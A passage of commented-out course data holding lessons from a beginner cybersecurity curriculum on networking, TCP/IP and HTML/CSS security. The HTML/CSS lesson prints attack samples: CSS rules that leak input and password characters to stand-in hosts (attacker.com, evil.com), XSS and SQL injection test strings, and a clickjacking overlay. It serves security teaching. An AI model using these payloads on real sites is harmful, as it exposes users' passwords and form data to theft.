//               type: "video",
//               completed: false,
//               content: `# Introduction to Networking

// Networking is the backbone of cybersecurity. Understanding how data flows across networks is essential for any security professional.

// ## What is Computer Networking?

// Computer networking is the practice of connecting computers and other devices to share resources, communicate, and exchange data. In cybersecurity, understanding networking helps us:

// - Identify potential attack vectors
// - Monitor network traffic for threats
// - Implement security controls
// - Investigate security incidents
// - Design secure network architectures

// ## Network Types

// ### **LAN (Local Area Network)**
// - Covers a small geographic area (home, office, building)
// - High-speed connections
// - Typically owned by a single organization
// - Examples: Home Wi-Fi, office network

// ### **WAN (Wide Area Network)**
// - Covers large geographic areas (cities, countries, continents)
// - Lower speed than LAN
// - Often uses public infrastructure
// - Examples: Internet, corporate networks across cities

// ### **MAN (Metropolitan Area Network)**
// - Covers a city or metropolitan area
// - Larger than LAN, smaller than WAN
// - Examples: City-wide Wi-Fi, cable TV networks

// ### **PAN (Personal Area Network)**
// - Very small area around an individual
// - Examples: Bluetooth connections, USB connections

// ## Network Topologies

// ### **Bus Topology**
// - All devices connected to a single cable
// - Simple but single point of failure
// - Rarely used in modern networks

// ### **Star Topology**
// - All devices connected to a central hub/switch
// - Most common in modern LANs
// - Central point can be a single point of failure

// ### **Ring Topology**
// - Devices connected in a circular fashion
// - Data travels in one direction
// - Used in some older networks

// ### **Mesh Topology**
// - Every device connected to every other device
// - Highly redundant and reliable
// - Expensive to implement

// ### **Hybrid Topology**
// - Combination of different topologies
// - Most real-world networks use hybrid approaches

// ## Network Devices

// ### **Hub**
// - Simple device that repeats data to all connected devices
// - Creates a single collision domain
// - Largely obsolete due to security and performance issues

// ### **Switch**
// - Intelligent device that learns MAC addresses
// - Creates separate collision domains for each port
// - Forwards data only to intended recipient
// - Foundation of modern LANs

// ### **Router**
// - Connects different networks
// - Makes forwarding decisions based on IP addresses
// - Provides network layer (Layer 3) functionality
// - Can perform NAT, firewall functions

// ### **Firewall**
// - Security device that filters network traffic
// - Can be hardware or software-based
// - Controls traffic based on predefined rules
// - Essential for network security

// ### **Access Point**
// - Provides wireless connectivity
// - Bridges wireless and wired networks
// - Can implement wireless security protocols

// ## Network Models

// ### **OSI Model (7 Layers)**
// The OSI (Open Systems Interconnection) model is a conceptual framework for understanding network communications.

// #### **Layer 7 - Application Layer**
// - User interface to network services
// - Examples: HTTP, HTTPS, FTP, SMTP, DNS
// - Security concerns: Application vulnerabilities, data validation

// #### **Layer 6 - Presentation Layer**
// - Data formatting, encryption, compression
// - Examples: SSL/TLS, JPEG, ASCII
// - Security concerns: Encryption strength, data integrity

// #### **Layer 5 - Session Layer**
// - Manages sessions between applications
// - Examples: NetBIOS, RPC, SQL sessions
// - Security concerns: Session hijacking, authentication

// #### **Layer 4 - Transport Layer**
// - End-to-end communication, reliability
// - Examples: TCP, UDP
// - Security concerns: Port scanning, DoS attacks

// #### **Layer 3 - Network Layer**
// - Routing, logical addressing
// - Examples: IP, ICMP, routing protocols
// - Security concerns: IP spoofing, routing attacks

// #### **Layer 2 - Data Link Layer**
// - Frame formatting, error detection, MAC addressing
// - Examples: Ethernet, Wi-Fi, switches
// - Security concerns: MAC spoofing, ARP poisoning

// #### **Layer 1 - Physical Layer**
// - Physical transmission of data
// - Examples: Cables, radio waves, fiber optics
// - Security concerns: Physical access, cable tapping

// ### **TCP/IP Model (4 Layers)**
// A simpler, more practical model used in real networks.

// #### **Application Layer**
// - Combines OSI layers 5, 6, and 7
// - Examples: HTTP, FTP, SMTP, DNS

// #### **Transport Layer**
// - Same as OSI Layer 4
// - Examples: TCP, UDP

// #### **Internet Layer**
// - Same as OSI Layer 3
// - Examples: IP, ICMP

// #### **Network Access Layer**
// - Combines OSI layers 1 and 2
// - Examples: Ethernet, Wi-Fi

// ## Basic Network Protocols

// ### **IP (Internet Protocol)**
// - Provides logical addressing
// - Routes packets across networks
// - Two versions: IPv4 and IPv6

// ### **TCP (Transmission Control Protocol)**
// - Reliable, connection-oriented protocol
// - Ensures data delivery and order
// - Used for applications requiring reliability

// ### **UDP (User Datagram Protocol)**
// - Unreliable, connectionless protocol
// - Faster than TCP
// - Used for applications where speed is more important than reliability

// ### **HTTP/HTTPS**
// - Web communication protocols
// - HTTPS adds encryption via SSL/TLS
// - Foundation of web security

// ### **DNS (Domain Name System)**
// - Translates domain names to IP addresses
// - Critical infrastructure component
// - Common target for attacks

// ### **DHCP (Dynamic Host Configuration Protocol)**
// - Automatically assigns IP addresses
// - Simplifies network management
// - Can be exploited for attacks

// ## Network Addressing

// ### **MAC Addresses**
// - Physical addresses burned into network cards
// - 48-bit addresses (6 bytes)
// - Format: XX:XX:XX:XX:XX:XX
// - Used at Layer 2 (Data Link)

// ### **IP Addresses**
// - Logical addresses for network communication
// - IPv4: 32-bit addresses (4 bytes)
// - IPv6: 128-bit addresses (16 bytes)
// - Used at Layer 3 (Network)

// ### **IPv4 Address Classes**
// - **Class A**: 1.0.0.0 to 126.255.255.255 (Large networks)
// - **Class B**: 128.0.0.0 to 191.255.255.255 (Medium networks)
// - **Class C**: 192.0.0.0 to 223.255.255.255 (Small networks)
// - **Class D**: 224.0.0.0 to 239.255.255.255 (Multicast)
// - **Class E**: 240.0.0.0 to 255.255.255.255 (Reserved)

// ### **Private IP Ranges**
// - **Class A**: 10.0.0.0/8
// - **Class B**: 172.16.0.0/12
// - **Class C**: 192.168.0.0/16

// ## Subnetting Basics

// ### **Subnet Mask**
// - Defines network and host portions of IP address
// - Common masks: 255.255.255.0 (/24), 255.255.0.0 (/16)

// ### **CIDR Notation**
// - Classless Inter-Domain Routing
// - Examples: 192.168.1.0/24, 10.0.0.0/8

// ## Network Security Concepts

// ### **Common Threats**
// - **Eavesdropping**: Intercepting network communications
// - **Man-in-the-Middle**: Intercepting and potentially modifying communications
// - **DoS/DDoS**: Overwhelming network resources
// - **Spoofing**: Impersonating another device or user
// - **Packet Sniffing**: Capturing and analyzing network traffic

// ### **Security Measures**
// - **Encryption**: Protecting data in transit
// - **Authentication**: Verifying identity
// - **Access Control**: Limiting network access
// - **Monitoring**: Detecting suspicious activity
// - **Segmentation**: Isolating network segments

// ## Practical Exercises

// ### **Exercise 1: Network Discovery**
// Use basic commands to explore your network:
// \`\`\`bash
// # Check your IP configuration
// ip addr show
// ifconfig

// # Check routing table
// ip route
// route -n

// # Check network connections
// netstat -an
// ss -tuln
// \`\`\`

// ### **Exercise 2: Basic Network Testing**
// \`\`\`bash
// # Test connectivity
// ping google.com
// ping 8.8.8.8

// # Trace route to destination
// traceroute google.com
// tracepath google.com

// # DNS lookup
// nslookup google.com
// dig google.com
// \`\`\`

// ## Tools for Network Analysis

// ### **Command Line Tools**
// - **ping**: Test connectivity
// - **traceroute**: Trace packet path
// - **netstat**: Show network connections
// - **ss**: Modern replacement for netstat
// - **nslookup/dig**: DNS queries

// ### **Graphical Tools**
// - **Wireshark**: Network protocol analyzer
// - **Nmap**: Network discovery and security auditing
// - **Zenmap**: Graphical frontend for Nmap

// ## Next Steps

// In the following lessons, we'll dive deeper into:
// - TCP/IP protocol suite
// - Network scanning and enumeration
// - Packet analysis with Wireshark
// - Network security tools
// - Wireless networking security

// **Remember**: Networking is fundamental to cybersecurity. Understanding how data flows helps you protect it better!`,
//             },
//             {
//               id: "tcp-ip-protocol-suite",
//               title: "TCP/IP Protocol Suite",
//               duration: "75 min",
//               type: "interactive",
//               completed: false,
//               content: `# TCP/IP Protocol Suite

// The TCP/IP protocol suite is the foundation of modern networking and the Internet. Understanding these protocols is crucial for cybersecurity professionals.

// ## Overview of TCP/IP

// TCP/IP (Transmission Control Protocol/Internet Protocol) is actually a collection of protocols that work together to enable network communication. It's organized into four layers:

// 1. **Application Layer**
// 2. **Transport Layer**
// 3. **Internet Layer**
// 4. **Network Access Layer**

// ## Internet Layer Protocols

// ### **IP (Internet Protocol)**

// IP is responsible for addressing and routing packets across networks.

// #### **IPv4 (Internet Protocol version 4)**
// - 32-bit addresses (4 bytes)
// - Format: dotted decimal notation (192.168.1.1)
// - Address space: ~4.3 billion addresses
// - Header size: 20-60 bytes

// #### **IPv4 Header Structure**
// \`\`\`
//  0                   1                   2                   3
//  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |Version|  IHL  |Type of Service|          Total Length         |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |         Identification        |Flags|      Fragment Offset    |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |  Time to Live |    Protocol   |         Header Checksum       |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |                       Source Address                          |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |                    Destination Address                        |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |                    Options                    |    Padding    |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// \`\`\`

// #### **Key IPv4 Header Fields**
// - **Version**: IP version (4 for IPv4)
// - **IHL**: Internet Header Length
// - **Type of Service**: Quality of Service markings
// - **Total Length**: Total packet size
// - **Identification**: Unique packet identifier
// - **Flags**: Control fragmentation
// - **Fragment Offset**: Position of fragment
// - **Time to Live (TTL)**: Maximum hops before discard
// - **Protocol**: Next layer protocol (TCP=6, UDP=17, ICMP=1)
// - **Header Checksum**: Error detection
// - **Source/Destination Address**: 32-bit IP addresses

// #### **IPv6 (Internet Protocol version 6)**
// - 128-bit addresses (16 bytes)
// - Format: hexadecimal notation (2001:db8::1)
// - Address space: ~340 undecillion addresses
// - Simplified header structure
// - Built-in security features

// ### **ICMP (Internet Control Message Protocol)**

// ICMP is used for error reporting and network diagnostics.

// #### **Common ICMP Message Types**
// - **Type 0**: Echo Reply (ping response)
// - **Type 3**: Destination Unreachable
// - **Type 5**: Redirect
// - **Type 8**: Echo Request (ping)
// - **Type 11**: Time Exceeded (traceroute)

// #### **ICMP in Security**
// - **Reconnaissance**: Attackers use ping sweeps
// - **Covert channels**: Data exfiltration via ICMP
// - **DoS attacks**: ICMP flood attacks
// - **Firewall evasion**: Using ICMP tunneling

// ## Transport Layer Protocols

// ### **TCP (Transmission Control Protocol)**

// TCP provides reliable, connection-oriented communication.

// #### **TCP Characteristics**
// - **Reliable**: Guarantees delivery and order
// - **Connection-oriented**: Establishes connection before data transfer
// - **Flow control**: Manages data transmission rate
// - **Error detection and correction**: Ensures data integrity
// - **Full-duplex**: Bidirectional communication

// #### **TCP Header Structure**
// \`\`\`
//  0                   1                   2                   3
//  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |          Source Port          |       Destination Port        |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |                        Sequence Number                        |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |                    Acknowledgment Number                      |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |  Data |           |U|A|P|R|S|F|                               |
// | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
// |       |           |G|K|H|T|N|N|                               |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |           Checksum            |         Urgent Pointer        |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |                    Options                    |    Padding    |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// \`\`\`

// #### **TCP Flags**
// - **SYN**: Synchronize sequence numbers (connection establishment)
// - **ACK**: Acknowledgment field is valid
// - **FIN**: Finish, no more data from sender
// - **RST**: Reset the connection
// - **PSH**: Push function, deliver data immediately
// - **URG**: Urgent pointer field is valid

// #### **TCP Three-Way Handshake**
// 1. **Client → Server**: SYN (Synchronize)
// 2. **Server → Client**: SYN-ACK (Synchronize-Acknowledge)
// 3. **Client → Server**: ACK (Acknowledge)

// \`\`\`
// Client                    Server
//   |                         |
//   |-------SYN seq=x-------->|
//   |                         |
//   |<---SYN-ACK seq=y,ack=x+1|
//   |                         |
//   |-------ACK ack=y+1------>|
//   |                         |
//   |    Connection Established|
// \`\`\`

// #### **TCP Connection Termination**
// 1. **Client → Server**: FIN
// 2. **Server → Client**: ACK
// 3. **Server → Client**: FIN
// 4. **Client → Server**: ACK

// ### **UDP (User Datagram Protocol)**

// UDP provides unreliable, connectionless communication.

// #### **UDP Characteristics**
// - **Unreliable**: No guarantee of delivery or order
// - **Connectionless**: No connection establishment
// - **Fast**: Lower overhead than TCP
// - **Simple**: Minimal protocol functionality

// #### **UDP Header Structure**
// \`\`\`
//  0      7 8     15 16    23 24    31
// +--------+--------+--------+--------+
// |     Source      |   Destination   |
// |      Port       |      Port       |
// +--------+--------+--------+--------+
// |                 |                 |
// |     Length      |    Checksum     |
// +--------+--------+--------+--------+
// |                                   |
// |              DATA                 |
// +-----------------------------------+
// \`\`\`

// #### **When to Use UDP**
// - **DNS queries**: Fast lookups
// - **DHCP**: Network configuration
// - **Streaming media**: Real-time applications
// - **Gaming**: Low-latency requirements
// - **SNMP**: Network management

// ## Application Layer Protocols

// ### **HTTP (Hypertext Transfer Protocol)**

// HTTP is the foundation of web communication.

// #### **HTTP Methods**
// - **GET**: Retrieve data
// - **POST**: Submit data
// - **PUT**: Update/create resource
// - **DELETE**: Remove resource
// - **HEAD**: Get headers only
// - **OPTIONS**: Get allowed methods

// #### **HTTP Status Codes**
// - **1xx**: Informational
// - **2xx**: Success (200 OK, 201 Created)
// - **3xx**: Redirection (301 Moved, 302 Found)
// - **4xx**: Client Error (400 Bad Request, 404 Not Found)
// - **5xx**: Server Error (500 Internal Error, 503 Unavailable)

// #### **HTTP Security Headers**
// \`\`\`
// Content-Security-Policy: default-src 'self'
// X-Frame-Options: DENY
// X-Content-Type-Options: nosniff
// Strict-Transport-Security: max-age=31536000
// \`\`\`

// ### **HTTPS (HTTP Secure)**

// HTTPS adds encryption to HTTP using SSL/TLS.

// #### **TLS Handshake Process**
// 1. **Client Hello**: Supported cipher suites
// 2. **Server Hello**: Selected cipher suite
// 3. **Certificate**: Server's public key
// 4. **Key Exchange**: Establish shared secret
// 5. **Finished**: Handshake complete

// ### **DNS (Domain Name System)**

// DNS translates domain names to IP addresses.

// #### **DNS Record Types**
// - **A**: IPv4 address
// - **AAAA**: IPv6 address
// - **CNAME**: Canonical name (alias)
// - **MX**: Mail exchange
// - **NS**: Name server
// - **PTR**: Reverse lookup
// - **TXT**: Text records

// #### **DNS Query Process**
// 1. **Client** queries local DNS resolver
// 2. **Resolver** queries root name server
// 3. **Root** responds with TLD name server
// 4. **Resolver** queries TLD name server
// 5. **TLD** responds with authoritative name server
// 6. **Resolver** queries authoritative name server
// 7. **Authoritative** responds with IP address

// ### **FTP (File Transfer Protocol)**

// FTP is used for file transfers.

// #### **FTP Modes**
// - **Active Mode**: Server initiates data connection
// - **Passive Mode**: Client initiates data connection

// #### **FTP Security Issues**
// - **Clear text**: Passwords sent in plain text
// - **No encryption**: Data transmitted unencrypted
// - **Solution**: Use SFTP or FTPS

// ## Port Numbers

// ### **Well-Known Ports (0-1023)**
// - **20/21**: FTP (data/control)
// - **22**: SSH
// - **23**: Telnet
// - **25**: SMTP
// - **53**: DNS
// - **80**: HTTP
// - **110**: POP3
// - **143**: IMAP
// - **443**: HTTPS
// - **993**: IMAPS
// - **995**: POP3S

// ### **Registered Ports (1024-49151)**
// - **1433**: Microsoft SQL Server
// - **3306**: MySQL
// - **3389**: RDP
// - **5432**: PostgreSQL
// - **8080**: HTTP alternate

// ### **Dynamic/Private Ports (49152-65535)**
// - Used for client connections
// - Assigned dynamically by the OS

// ## Network Analysis with Command Line Tools

// ### **netstat** - Network Statistics
// \`\`\`bash
// netstat -an              # All connections and listening ports
// netstat -tuln            # TCP and UDP listening ports
// netstat -r               # Routing table
// netstat -i               # Interface statistics
// \`\`\`

// ### **ss** - Socket Statistics (modern netstat)
// \`\`\`bash
// ss -tuln                 # TCP and UDP listening ports
// ss -an                   # All connections
// ss -p                    # Show process information
// \`\`\`

// ### **tcpdump** - Packet Capture
// \`\`\`bash
// tcpdump -i eth0          # Capture on interface eth0
// tcpdump host 192.168.1.1 # Capture traffic to/from specific host
// tcpdump port 80          # Capture HTTP traffic
// tcpdump -w capture.pcap  # Write to file
// \`\`\`

// ### **nmap** - Network Scanning
// \`\`\`bash
// nmap 192.168.1.1         # Basic port scan
// nmap -sS 192.168.1.1     # SYN scan
// nmap -sU 192.168.1.1     # UDP scan
// nmap -A 192.168.1.1      # Aggressive scan
// \`\`\`

// ## Security Implications

// ### **Protocol Vulnerabilities**
// - **IP**: Spoofing, fragmentation attacks
// - **TCP**: SYN flooding, session hijacking
// - **UDP**: Amplification attacks, spoofing
// - **ICMP**: Reconnaissance, covert channels
// - **DNS**: Cache poisoning, tunneling
// - **HTTP**: Injection attacks, session management

// ### **Network Security Best Practices**
// 1. **Use encrypted protocols** (HTTPS, SSH, SFTP)
// 2. **Implement firewalls** to filter traffic
// 3. **Monitor network traffic** for anomalies
// 4. **Use intrusion detection systems**
// 5. **Segment networks** to limit attack spread
// 6. **Keep protocols updated** to patch vulnerabilities

// ## Practical Exercises

// ### **Exercise 1: Protocol Analysis**
// 1. Use Wireshark to capture HTTP traffic
// 2. Analyze the TCP three-way handshake
// 3. Examine HTTP request/response headers
// 4. Identify potential security issues

// ### **Exercise 2: Port Scanning**
// 1. Use nmap to scan a target system
// 2. Identify open ports and services
// 3. Determine service versions
// 4. Assess potential vulnerabilities

// ### **Exercise 3: DNS Investigation**
// 1. Use dig to query different DNS record types
// 2. Trace DNS resolution process
// 3. Identify DNS servers for a domain
// 4. Look for DNS security extensions (DNSSEC)

// ## Next Steps

// Now that you understand TCP/IP protocols, you're ready to:
// - Learn about network security tools
// - Practice packet analysis with Wireshark
// - Explore network scanning techniques
// - Study wireless networking protocols
// - Understand network attack methodologies

// **Remember**: Protocols are the language of networks. Understanding them deeply is essential for effective cybersecurity!`,
//             },
//           ],
//         },
//         {
//           id: "web-basics",
//           title: "Web Technologies Basics",
//           description: "Learn HTML, HTTP, and web application fundamentals for security testing.",
//           duration: "2 weeks",
//           estimatedHours: "25 hours",
//           difficulty: "Beginner",
//           completed: false,
//           locked: false,
//           icon: "Globe",
//           color: "bg-orange-500",
//           lessons: [
//             {
//               id: "html-css-basics",
//               title: "HTML & CSS Fundamentals",
//               duration: "60 min",
//               type: "interactive",
//               completed: false,
//               content: `# HTML & CSS Fundamentals for Security

// Understanding HTML and CSS is crucial for web application security testing. These technologies form the foundation of web applications and are often the first point of interaction with potential vulnerabilities.

// ## HTML (HyperText Markup Language)

// HTML is the standard markup language for creating web pages. From a security perspective, understanding HTML helps identify injection points and potential attack vectors.

// ### **Basic HTML Structure**

// \`\`\`html
// <!DOCTYPE html>
// <html lang="en">
// <head>
//     <meta charset="UTF-8">
//     <meta name="viewport" content="width=device-width, initial-scale=1.0">
//     <title>Security Testing Page</title>
// </head>
// <body>
//     <h1>Welcome to Security Testing</h1>
//     <p>This is a sample page for learning web security.</p>
// </body>
// </html>
// \`\`\`

// ### **Security-Relevant HTML Elements**

// #### **Forms - Primary Attack Vectors**
// Forms are common targets for various attacks including XSS, CSRF, and injection attacks.

// \`\`\`html
// <form action="/login" method="POST">
//     <label for="username">Username:</label>
//     <input type="text" id="username" name="username" required>
    
//     <label for="password">Password:</label>
//     <input type="password" id="password" name="password" required>
    
//     <input type="submit" value="Login">
// </form>
// \`\`\`

// **Security Considerations:**
// - **Method attribute**: GET vs POST implications
// - **Action attribute**: Where data is sent
// - **Input validation**: Client-side vs server-side
// - **CSRF tokens**: Protection against cross-site request forgery

// #### **Input Types and Security**

// \`\`\`html
// <!-- Text inputs - XSS vulnerable if not properly handled -->
// <input type="text" name="search" placeholder="Search...">

// <!-- Hidden inputs - Can be modified by attackers -->
// <input type="hidden" name="user_id" value="123">

// <!-- File uploads - Potential for malicious file uploads -->
// <input type="file" name="avatar" accept="image/*">

// <!-- Email inputs - May have different validation -->
// <input type="email" name="email">

// <!-- URL inputs - Can be exploited for SSRF -->
// <input type="url" name="website">
// \`\`\`

// #### **Links and Navigation**

// \`\`\`html
// <!-- External links - Potential for phishing -->
// <a href="https://example.com" target="_blank" rel="noopener noreferrer">
//     External Link
// </a>

// <!-- JavaScript links - XSS potential -->
// <a href="javascript:alert('XSS')">Click me</a>

// <!-- Data URLs - Can contain malicious content -->
// <a href="data:text/html,<script>alert('XSS')</script>">Data URL</a>
// \`\`\`

// #### **Script and Style Tags**

// \`\`\`html
// <!-- Inline scripts - XSS injection points -->
// <script>
//     var userInput = "USER_INPUT_HERE";
//     console.log(userInput);
// </script>

// <!-- External scripts - Supply chain attacks -->
// <script src="https://cdn.example.com/library.js"></script>

// <!-- Inline styles - CSS injection potential -->
// <style>
//     .user-content { color: red; }
// </style>

// <!-- External stylesheets -->
// <link rel="stylesheet" href="styles.css">
// \`\`\`

// ### **HTML5 Security Features**

// #### **Content Security Policy (CSP)**
// \`\`\`html
// <meta http-equiv="Content-Security-Policy" 
//       content="default-src 'self'; script-src 'self' 'unsafe-inline';">
// \`\`\`

// #### **Iframe Sandboxing**
// \`\`\`html
// <iframe src="untrusted.html" sandbox="allow-scripts allow-same-origin">
// </iframe>
// \`\`\`

// #### **HTTPS Enforcement**
// \`\`\`html
// <meta http-equiv="Strict-Transport-Security" 
//       content="max-age=31536000; includeSubDomains">
// \`\`\`

// ## CSS (Cascading Style Sheets)

// CSS controls the presentation of HTML elements. While primarily for styling, CSS can also be exploited for attacks.

// ### **Basic CSS Syntax**

// \`\`\`css
// /* Selector { property: value; } */
// h1 {
//     color: blue;
//     font-size: 24px;
//     margin: 10px 0;
// }

// .highlight {
//     background-color: yellow;
//     padding: 5px;
// }

// #main-content {
//     width: 80%;
//     margin: 0 auto;
// }
// \`\`\`

// ### **CSS Selectors**

// \`\`\`css
// /* Element selector */
// p { color: black; }

// /* Class selector */
// .warning { color: red; }

// /* ID selector */
// #header { background: blue; }

// /* Attribute selector */
// input[type="password"] { border: 2px solid red; }

// /* Descendant selector */
// div p { margin: 5px; }

// /* Child selector */
// ul > li { list-style: none; }

// /* Pseudo-classes */
// a:hover { color: red; }
// input:focus { outline: 2px solid blue; }
// \`\`\`

// ### **CSS Security Vulnerabilities**

// #### **CSS Injection**
// Attackers can inject malicious CSS to:
// - Steal data through CSS selectors
// - Perform clickjacking attacks
// - Exfiltrate information via background images

// \`\`\`css
// /* Malicious CSS - Data exfiltration */
// input[value^="a"] { background: url(http://attacker.com/log?char=a); }
// input[value^="b"] { background: url(http://attacker.com/log?char=b); }

// /* Clickjacking via CSS */
// .malicious-overlay {
//     position: absolute;
//     top: 0;
//     left: 0;
//     width: 100%;
//     height: 100%;
//     opacity: 0;
//     z-index: 9999;
// }
// \`\`\`

// #### **CSS-Based Attacks**

// **1. Keylogger via CSS**
// \`\`\`css
// input[type="password"][value$="a"] ~ * { background: url(http://evil.com/a); }
// input[type="password"][value$="b"] ~ * { background: url(http://evil.com/b); }
// \`\`\`

// **2. History Sniffing**
// \`\`\`css
// a:visited { background: url(http://attacker.com/visited); }
// \`\`\`

// **3. Timing Attacks**
// \`\`\`css
// @import url(http://attacker.com/slow-response);
// \`\`\`

// ### **Responsive Design and Security**

// \`\`\`css
// /* Media queries for responsive design */
// @media screen and (max-width: 768px) {
//     .desktop-only { display: none; }
//     .mobile-menu { display: block; }
// }

// /* Viewport meta tag in HTML */
// /* <meta name="viewport" content="width=device-width, initial-scale=1.0"> */
// \`\`\`

// ## DOM (Document Object Model)

// The DOM represents the HTML document as a tree structure that can be manipulated by JavaScript.

// ### **DOM Structure**
// \`\`\`
// document
// └── html
//     ├── head
//     │   ├── title
//     │   └── meta
//     └── body
//         ├── h1
//         ├── p
//         └── form
//             ├── input
//             └── button
// \`\`\`

// ### **DOM Manipulation Security**

// \`\`\`javascript
// // Dangerous - Direct HTML insertion
// element.innerHTML = userInput; // XSS vulnerable

// // Safer - Text content only
// element.textContent = userInput;

// // Safer - Create elements programmatically
// const newElement = document.createElement('p');
// newElement.textContent = userInput;
// parent.appendChild(newElement);
// \`\`\`

// ## Security Testing Considerations

// ### **Client-Side Validation Bypass**

// HTML5 provides built-in validation, but it can be easily bypassed:

// \`\`\`html
// <!-- Client-side validation -->
// <input type="email" required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$">

// <!-- Can be bypassed by: -->
// <!-- 1. Disabling JavaScript -->
// <!-- 2. Modifying HTML with developer tools -->
// <!-- 3. Intercepting requests with proxy tools -->
// \`\`\`

// ### **Hidden Field Manipulation**

// \`\`\`html
// <!-- Hidden fields can be modified -->
// <input type="hidden" name="price" value="100.00">
// <input type="hidden" name="user_role" value="user">

// <!-- Attackers can change these values -->
// \`\`\`

// ### **Form Method Security**

// \`\`\`html
// <!-- GET method - Data in URL (insecure for sensitive data) -->
// <form method="GET" action="/search">
//     <input type="text" name="query">
// </form>

// <!-- POST method - Data in request body (more secure) -->
// <form method="POST" action="/login">
//     <input type="password" name="password">
// </form>
// \`\`\`

// ## Practical Security Testing

// ### **Using Browser Developer Tools**

// 1. **Inspect Element** (F12)
//    - Modify HTML attributes
//    - Change form actions and methods
//    - Alter hidden field values

// 2. **Console**
//    - Execute JavaScript
//    - Manipulate DOM elements
//    - Test for XSS vulnerabilities

// 3. **Network Tab**
//    - Monitor HTTP requests
//    - Analyze request/response headers
//    - Identify sensitive data transmission

// ### **Common Testing Scenarios**

// #### **1. Input Validation Testing**
// \`\`\`html
// <!-- Test with various inputs -->
// <input type="text" name="username">

// <!-- Test cases: -->
// <!-- - Special characters: <>"'&; -->
// <!-- - SQL injection: ' OR '1'='1 -->
// <!-- - XSS payloads: <script>alert('XSS')</script> -->
// <!-- - Long strings: A repeated 1000 times -->
// \`\`\`

// #### **2. File Upload Testing**
// \`\`\`html
// <input type="file" name="upload" accept="image/*">

// <!-- Test cases: -->
// <!-- - Upload executable files (.exe, .php, .jsp) -->
// <!-- - Large files (DoS potential) -->
// <!-- - Files with malicious content -->
// <!-- - Double extensions (file.jpg.php) -->
// \`\`\`

// #### **3. Form Manipulation**
// \`\`\`html
// <form action="/purchase" method="POST">
//     <input type="hidden" name="price" value="100">
//     <input type="hidden" name="item_id" value="123">
//     <input type="submit" value="Buy Now">
// </form>

// <!-- Modify hidden fields to test authorization -->
// \`\`\`

// ## Best Practices for Secure HTML/CSS

// ### **HTML Security Best Practices**

// 1. **Input Validation**
//    - Always validate on server-side
//    - Use appropriate input types
//    - Implement proper length limits

// 2. **Output Encoding**
//    - Encode user data before displaying
//    - Use context-appropriate encoding
//    - Implement Content Security Policy

// 3. **Form Security**
//    - Use CSRF tokens
//    - Implement proper authentication
//    - Validate all form submissions

// ### **CSS Security Best Practices**

// 1. **Content Security Policy**
//    - Restrict inline styles
//    - Whitelist trusted sources
//    - Use nonces for dynamic styles

// 2. **Input Sanitization**
//    - Sanitize user-controlled CSS
//    - Validate CSS properties
//    - Prevent CSS injection

// ## Practical Exercises

// ### **Exercise 1: HTML Form Security**
// 1. Create a login form with username and password fields
// 2. Add client-side validation
// 3. Test bypassing the validation using developer tools
// 4. Identify potential security issues

// ### **Exercise 2: CSS Injection Testing**
// 1. Create a page that accepts user CSS input
// 2. Test various CSS injection payloads
// 3. Attempt to exfiltrate data using CSS
// 4. Implement proper sanitization

// ### **Exercise 3: DOM Manipulation**
// 1. Create a page with dynamic content
// 2. Use JavaScript to manipulate the DOM
// 3. Test for XSS vulnerabilities
// 4. Implement secure DOM manipulation

// ## Tools for HTML/CSS Security Testing

// ### **Browser Extensions**
// - **Web Developer**: Modify page elements
// - **Wappalyzer**: Identify technologies
// - **EditThisCookie**: Manipulate cookies

// ### **Proxy Tools**
// - **Burp Suite**: Intercept and modify requests
// - **OWASP ZAP**: Automated security testing
// - **Fiddler**: HTTP debugging proxy

// ### **Online Tools**
// - **HTML Validator**: Check HTML syntax
// - **CSS Validator**: Validate CSS code
// - **CSP Evaluator**: Test Content Security Policy

// ## Next Steps

// Now that you understand HTML and CSS fundamentals, you're ready to:
// - Learn about HTTP protocol and web communication
// - Explore JavaScript and client-side security
// - Study web application architectures
// - Practice with vulnerable web applications
// - Learn about web application security testing tools

// **Remember**: Understanding the building blocks of web applications is essential for identifying and exploiting security vulnerabilities!`,
//             },
//           ],
//         },
//         {
//           id: "security-fundamentals",
//           title: "Security Fundamentals",
//           description: "Core security concepts, CIA triad, and basic security principles.",
//           duration: "2 weeks",
//           estimatedHours: "20 hours",
//           difficulty: "Beginner",
//           completed: false,
//           locked: false,
//           icon: "Shield",
//           color: "bg-red-500",
//           lessons: [],
//         },
//         {
//           id: "basic-tools",
//           title: "Essential Security Tools",
